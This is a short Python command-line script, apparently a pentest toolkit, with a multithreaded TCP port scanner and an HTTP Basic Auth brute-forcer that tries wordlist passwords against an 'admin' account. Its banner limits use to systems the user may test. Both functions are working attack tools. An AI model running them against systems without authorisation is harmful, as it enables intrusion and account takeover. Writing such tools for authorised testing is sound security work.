import argparse, socket, concurrent.futures, time, requests, sys

def scan_port(host, port, timeout=1.0):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            return port, True
        except Exception:
            return port, False

def port_scanner(host, start, end, workers=200):
    open_ports = []
    print(f"Scanning {host}:{start}-{end} with {workers} workers")
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(scan_port, host, p): p for p in range(start, end+1)}
        for fut in concurrent.futures.as_completed(futures):
            p, ok = fut.result()
            if ok:
                print(f"  OPEN: {p}")
                open_ports.append(p)
    return open_ports

def http_bruteforce(url, wordlist_file, throttle=0.5):
    """
    Demonstration HTTP Basic Auth brute force. Only against systems you own/test.
    """
    print("** HTTP brute force demo — only run on systems you have permission to test **")
    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
        words = [w.strip() for w in f if w.strip()]

    for pwd in words:
        try:
            r = requests.get(url, auth=("admin", pwd), timeout=6)
        except Exception as e:
            continue
        if r.status_code != 401:
            print("SUCCESS — admin:", pwd, "status:", r.status_code)
            return ("admin", pwd)
        time.sleep(throttle)
    print("No password found in wordlist.")
    return None

def main():
    ap = argparse.ArgumentParser(prog="pentest_toolkit")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_ports = sub.add_parser("ports")
    p_ports.add_argument("--host", required=True)
    p_ports.add_argument("--start", type=int, default=1)
    p_ports.add_argument("--end", type=int, default=1024)
    p_ports.add_argument("--workers", type=int, default=200)

    p_brute = sub.add_parser("http-brute")
    p_brute.add_argument("--url", required=True)
    p_brute.add_argument("--wordlist", required=True)
    p_brute.add_argument("--throttle", type=float, default=0.5)

    args = ap.parse_args()
    if args.cmd == "ports":
        port_scanner(args.host, args.start, args.end, workers=args.workers)
    elif args.cmd == "http-brute":
        http_bruteforce(args.url, args.wordlist, throttle=args.throttle)

if __name__ == "__main__":
    main()
